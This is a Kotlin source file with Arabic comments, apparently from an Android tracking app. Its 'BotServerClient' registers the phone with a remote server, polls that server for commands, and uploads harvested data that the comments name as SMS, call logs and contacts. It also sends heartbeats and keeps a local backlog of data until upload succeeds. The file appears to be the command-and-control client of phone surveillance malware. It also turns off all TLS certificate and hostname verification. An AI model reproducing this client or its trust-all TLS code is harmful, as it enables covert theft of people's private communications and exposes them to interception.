package com.abuzahra.tracker

import android.content.Context
import android.os.Build
import android.util.Log
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.cert.X509Certificate
import java.util.concurrent.TimeUnit
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.SSLSession
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

/**
 * BotServerClient - كلاس singleton للتواصل مع سيرفر البوت
 * يتعامل مع تسجيل الجهاز، استقبال الأوامر، رفع البيانات، وإرسال نبضات القلب
 *
 * عنوان السيرفر: https://alsydyabwalzhra.online:8443
 */
object BotServerClient {

    private const val TAG = "BotServerClient"
    private const val SERVER_URL = "https://alsydyabwalzhra.online"
    private const val CONNECT_TIMEOUT = 15000 // 15 ثانية
    private const val READ_TIMEOUT = 30000    // 30 ثانية

    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ==================== ==================== ====================
    //                  كلاسات البيانات (Data Classes)
    // ==================== ==================== ====================

    /**
     * طلب تسجيل جهاز جديد
     */
    data class RegisterRequest(
        val device_id: String,
        val device_name: String,
        val device_model: String,
        val brand: String,
        val os_version: String,
        val battery: Int,
        val link_code: String
    )

    /**
     * استجابة تسجيل الجهاز
     */
    data class RegisterResponse(
        val success: Boolean = false,
        val message: String = "",
        val device_token: String? = null
    )

    /**
     * أمر وارد من السيرفر
     */
    data class Command(
        val command: String = "",
        val timestamp: String = "",
        val id: String? = null,
        val params: Map<String, String>? = null
    )

    /**
     * استجابة الأوامر المعلقة
     */
    data class CommandResponse(
        val success: Boolean = false,
        val commands: List<Command> = emptyList(),
        val message: String = ""
    )

    /**
     * طلب رفع البيانات
     */
    data class DataUploadRequest(
        val device_id: String,
        val command: String,
        val data: Any,
        val timestamp: Long = System.currentTimeMillis()
    )

    /**
     * طلب نبض القلب
     */
    data class HeartbeatRequest(
        val device_id: String,
        val status: String = "online",
        val battery: Int,
        val timestamp: Long = System.currentTimeMillis()
    )

    // ==================== ==================== ====================
    //              الوظائف الرئيسية (Main Functions)
    // ==================== ==================== ====================

    /**
     * تسجيل الجهاز في سيرفر البوت
     * @param context سياق التطبيق
     * @param linkCode كود الربط
     * @return true إذا نجح التسجيل
     */
    suspend fun registerDevice(context: Context, linkCode: String): Boolean {
        return try {
            val deviceId = SharedPrefsManager.getDeviceId(context) ?: return false
            val deviceName = getDeviceName(context)
            val deviceModel = Build.MODEL
            val brand = Build.BRAND
            val osVersion = "Android ${Build.VERSION.RELEASE}"
            val battery = getBatteryLevel(context)

            val request = RegisterRequest(
                device_id = deviceId,
                device_name = deviceName,
                device_model = deviceModel,
                brand = brand,
                os_version = osVersion,
                battery = battery,
                link_code = linkCode
            )

            val responseJson = httpPost("/api/register", gson.toJson(request))
            if (responseJson != null) {
                val response = gson.fromJson(responseJson, RegisterResponse::class.java)
                Log.d(TAG, "تسجيل الجهاز: success=${response.success}, message=${response.message}")
                if (response.success) {
                    // حفظ حالة التسجيل
                    SharedPrefsManager.setBotRegistered(context, true)
                    // حفظ التوكن إذا تم إرجاعه
                    response.device_token?.let { token ->
                        SharedPrefsManager.setBotToken(context, token)
                    }
                    true
                } else {
                    Log.e(TAG, "فشل تسجيل الجهاز: ${response.message}")
                    false
                }
            } else {
                Log.e(TAG, "لا يوجد استجابة من السيرفر عند التسجيل")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في تسجيل الجهاز: ${e.message}", e)
            false
        }
    }

    /**
     * الحصول على الأوامر المعلقة من السيرفر
     * @param deviceId معرف الجهاز
     * @return قائمة الأوامر
     */
    suspend fun getPendingCommands(deviceId: String): List<Command> {
        return try {
            val responseJson = httpGet("/api/commands?device_id=$deviceId")
            if (responseJson != null) {
                val responseType = object : TypeToken<CommandResponse>() {}.type
                val response = gson.fromJson<CommandResponse>(responseJson, responseType)
                Log.d(TAG, "تم استلام ${response.commands.size} أوامر")
                response.commands
            } else {
                Log.d(TAG, "لا توجد أوامر معلقة أو فشل الاتصال")
                emptyList()
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جلب الأوامر: ${e.message}", e)
            emptyList()
        }
    }

    /**
     * رفع البيانات المجمعة إلى السيرفر
     * @param deviceId معرف الجهاز
     * @param command نوع الأمر (sms, calls, contacts, etc.)
     * @param data البيانات المراد رفعها
     * @return true إذا نجح الرفع
     */
    suspend fun uploadData(deviceId: String, command: String, data: Any): Boolean {
        return try {
            val request = DataUploadRequest(
                device_id = deviceId,
                command = command,
                data = data
            )

            val responseJson = httpPost("/api/data", gson.toJson(request))
            if (responseJson != null) {
                Log.d(TAG, "تم رفع بيانات [$command] بنجاح")
                true
            } else {
                Log.e(TAG, "فشل رفع بيانات [$command]")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في رفع البيانات [$command]: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال نبض قلب (heartbeat) للسيرفر
     * @param deviceId معرف الجهاز
     * @param status حالة الجهاز (online/offline)
     * @param battery مستوى البطارية
     * @return true إذا نجح الإرسال
     */
    suspend fun sendHeartbeat(deviceId: String, status: String, battery: Int): Boolean {
        return try {
            val request = HeartbeatRequest(
                device_id = deviceId,
                status = status,
                battery = battery
            )

            val responseJson = httpPost("/api/heartbeat", gson.toJson(request))
            responseJson != null
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إرسال نبض القلب: ${e.message}", e)
            false
        }
    }

    // ==================== ==================== ====================
    //             دالة الجمع والتخزين والرفع (Convenience)
    // ==================== ==================== ====================

    /**
     * تجميع وتخزين ورفع البيانات - دالة شاملة
     * تقوم بجمع البيانات محلياً ثم رفعها للسيرفر
     *
     * @param context سياق التطبيق
     * @param command نوع الأمر
     * @param data البيانات المجمعة
     */
    fun storeAndUpload(context: Context, command: String, data: Any) {
        val deviceId = SharedPrefsManager.getDeviceId(context) ?: return

        scope.launch {
            try {
                // 1. حفظ البيانات محلياً أولاً (ضمان عدم ضياعها)
                LocalStorageManager.storeData(context, command, data)
                Log.d(TAG, "تم حفظ بيانات [$command] محلياً")

                // 2. محاولة رفع البيانات للسيرفر
                val uploaded = uploadData(deviceId, command, data)
                if (uploaded) {
                    Log.d(TAG, "تم رفع بيانات [$command] إلى السيرفر بنجاح")
                } else {
                    Log.w(TAG, "لم يتم رفع بيانات [$command] - محفوظة محلياً فقط")
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في storeAndUpload [$command]: ${e.message}", e)
            }
        }
    }

    /**
     * رفع جميع البيانات المحلية المتراكمة إلى السيرفر
     * مفيد عند استعادة الاتصال بالإنترنت
     *
     * @param context سياق التطبيق
     * @return عدد الملفات التي تم رفعها
     */
    suspend fun uploadAllPendingData(context: Context): Int {
        val deviceId = SharedPrefsManager.getDeviceId(context) ?: return 0
        var uploadedCount = 0

        try {
            val allFiles = LocalStorageManager.getAllFiles(context)
            Log.d(TAG, "وجد ${allFiles.size} ملف محلي للرفع")

            for (file in allFiles) {
                try {
                    val content = file.readText()
                    val fileName = file.nameWithoutExtension
                    // استخراج نوع الأمر من اسم الملف: "sms_1234567890" -> "sms"
                    val command = fileName.substringBefore("_")

                    val uploaded = uploadData(deviceId, command, content)
                    if (uploaded) {
                        file.delete()
                        uploadedCount++
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في رفع ملف ${file.name}: ${e.message}")
                }
            }

            // تنظيف البيانات القديمة بعد الرفع
            LocalStorageManager.clearOldData(context, keepLast = 200)

            if (uploadedCount > 0) {
                Log.d(TAG, "تم رفع $uploadedCount ملف بنجاح")
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في رفع البيانات المعلقة: ${e.message}", e)
        }

        return uploadedCount
    }

    // ==================== ==================== ====================
    //              دوال HTTP المساعدة (HTTP Helpers)
    // ==================== ==================== ====================

    /**
     * إرسال طلب HTTP POST
     * @param endpoint المسار (مثال: /api/register)
     * @param body جسم الطلب (JSON)
     * @return استجابة السيرفر كنص أو null عند الفشل
     */
    private fun httpPost(endpoint: String, body: String): String? {
        return try {
            val url = URL("$SERVER_URL$endpoint")
            val connection = setupConnection(url) as? HttpURLConnection ?: return null
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.setRequestProperty("Accept", "application/json")
            connection.doOutput = true

            // إرسال جسم الطلب
            OutputStreamWriter(connection.outputStream, "UTF-8").use { writer ->
                writer.write(body)
                writer.flush()
            }

            // قراءة الاستجابة
            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                responseBody
            } else {
                Log.e(TAG, "HTTP POST فشل: $responseCode - $responseBody - endpoint: $endpoint")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في HTTP POST [$endpoint]: ${e.message}", e)
            null
        }
    }

    /**
     * إرسال طلب HTTP GET
     * @param endpoint المسار مع المعاملات (مثال: /api/commands?device_id=xxx)
     * @return استجابة السيرفر كنص أو null عند الفشل
     */
    private fun httpGet(endpoint: String): String? {
        return try {
            val url = URL("$SERVER_URL$endpoint")
            val connection = setupConnection(url) as? HttpURLConnection ?: return null
            connection.requestMethod = "GET"
            connection.setRequestProperty("Accept", "application/json")

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                responseBody
            } else {
                Log.e(TAG, "HTTP GET فشل: $responseCode - endpoint: $endpoint")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في HTTP GET [$endpoint]: ${e.message}", e)
            null
        }
    }

    /**
     * إعداد اتصال HTTP/HTTPS مع دعم SSL
     */
    private fun setupConnection(url: URL): java.net.HttpURLConnection {
        val connection = url.openConnection() as java.net.HttpURLConnection
        connection.connectTimeout = CONNECT_TIMEOUT
        connection.readTimeout = READ_TIMEOUT

        // إعداد SSL للاتصال الآمن (مع تجاوز مشاكل الشهادات في بيئة التطوير)
        if (connection is HttpsURLConnection) {
            try {
                val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
                    override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                })

                val sslContext = SSLContext.getInstance("TLS")
                sslContext.init(null, trustAllCerts, java.security.SecureRandom())
                connection.sslSocketFactory = sslContext.socketFactory
                connection.hostnameVerifier = HostnameVerifier { _, _ -> true }
            } catch (e: Exception) {
                Log.w(TAG, "تحذير: لم يتم إعداد SSL بشكل كامل: ${e.message}")
            }
        }

        return connection
    }

    /**
     * قراءة استجابة HTTP كاملة (سواء نجاح أو خطأ)
     */
    private fun readResponse(connection: HttpURLConnection): String {
        val stream = try {
            connection.inputStream
        } catch (e: Exception) {
            connection.errorStream
        }

        return stream?.bufferedReader()?.use { reader ->
            reader.readText()
        } ?: ""
    }

    // ==================== ==================== ====================
    //            دوال مساعدة للحصول على معلومات الجهاز
    // ==================== ==================== ====================

    /**
     * الحصول على اسم الجهاز
     */
    private fun getDeviceName(context: Context): String {
        return try {
            val name = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "bluetooth_name"
            ) ?: if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) {
                android.provider.Settings.System.getString(
                    context.contentResolver,
                    "device_name"
                )
            } else null
            name ?: Build.DEVICE
        } catch (e: Exception) {
            Build.DEVICE
        }
    }

    /**
     * الحصول على مستوى البطارية
     */
    private fun getBatteryLevel(context: Context): Int {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
            bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
        } catch (e: Exception) {
            100
        }
    }

    /**
     * إيقاف جميع العمليات الخلفية
     */
    fun shutdown() {
        scope.cancel()
    }
}
